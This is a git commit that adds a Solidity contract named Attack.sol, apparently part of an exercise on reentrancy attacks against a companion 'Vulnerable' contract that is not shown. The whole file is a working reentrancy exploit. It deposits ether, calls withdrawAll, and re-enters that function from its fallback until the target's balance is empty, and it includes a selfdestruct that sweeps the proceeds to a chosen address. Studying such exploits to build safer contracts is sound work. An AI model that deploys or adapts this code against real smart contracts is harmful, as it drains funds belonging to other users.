42474418abcf43b80a8e15182f6292a8218a5ed7
hadi <hadi.mohammad.saleh1@gmail.com>
2021-10-26 10:49:13 +0300

    init commit

---
+++ reentrace hack/attack withdrawAll/Attack.sol
@@ -0,0 +1,29 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity >=0.7.0 <0.9.0;
+import "./Vulnerable.sol";
+contract Attack{
+    Vulnerable public vulnerable;
+    
+    constructor(Vulnerable _vulnerable){
+        vulnerable = _vulnerable;
+    }
+    
+    function attack () public payable{
+        vulnerable.deposit{value : msg.value}();
+        vulnerable.withdrawAll();
+    }
+    
+    fallback () external payable{
+        if(address(vulnerable).balance != 0)
+        vulnerable.withdrawAll();
+    }
+    
+    function getBalance()public view returns(uint256){
+    return address(this).balance;
+}
+
+    function destroy(address payable addr) public{
+        selfdestruct(addr);
+    }
+}
